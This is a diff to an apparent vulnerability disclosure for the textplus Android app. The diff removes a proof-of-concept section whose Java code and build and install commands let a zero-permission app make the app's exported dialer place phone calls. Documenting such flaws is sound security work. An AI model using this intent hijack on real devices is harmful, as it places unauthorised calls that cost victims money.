@@ -163,7 +163,7 @@ finds the door; the actual key is in the bytecode.
 
 ## Reproduction
 
-### adb (minimal repro)
+### adb
 
 Use a destination you control. The PSTN path consumes account credits.
 
@@ -193,32 +193,6 @@ adb logcat -c && adb logcat | grep -iE "makeCall|LinphoneCallStack|CallingServic
 
 Both variants reach the call stack and place the call.
 
-### PoC app
-
-`poc-app/` is a standalone Android project demonstrating reachability from an
-unprivileged third-party app. It declares **zero permissions**. It builds the
-explicit intent and calls `startActivity`.
-
-```java
-Intent i = new Intent();
-i.setComponent(new ComponentName(
-        "com.gogii.textplus",
-        "com.nextplus.android.activity.DialerActivity"));
-i.putExtra("com.nextplus.android.fragment.INTENT_ADDRESS_TO_CALL", dest);
-i.putExtra("com.nextplus.android.fragment.INTENT_DISPLAY_STRING", "poc");
-i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-startActivity(i);
-```
-
-The manifest carries only a `<queries>` entry for package visibility (Android 11+);
-no `<uses-permission>` is present.
-
-```bash
-cd poc-app
-gradle wrapper && ./gradlew assembleDebug
-adb install -r app/build/outputs/apk/debug/app-debug.apk
-adb shell monkey -p sh.actuator.forcecall -c android.intent.category.LAUNCHER 1
-```
 
 ## Impact
 
